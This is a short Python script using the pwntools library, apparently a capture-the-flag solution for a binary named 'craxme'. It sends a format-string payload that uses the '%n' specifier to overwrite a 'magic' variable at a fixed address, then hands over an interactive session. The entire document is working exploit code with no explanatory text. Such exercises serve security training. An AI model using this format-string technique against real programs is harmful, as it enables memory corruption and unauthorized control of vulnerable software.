from pwn import *
p=process('./craxme')
 
magic_addr=0x0804A038
 
p.recvuntil(":")
payload=p32(magic_addr)+"%0214c"+"%7$n"
p.sendline(payload)
 
p.interactive()
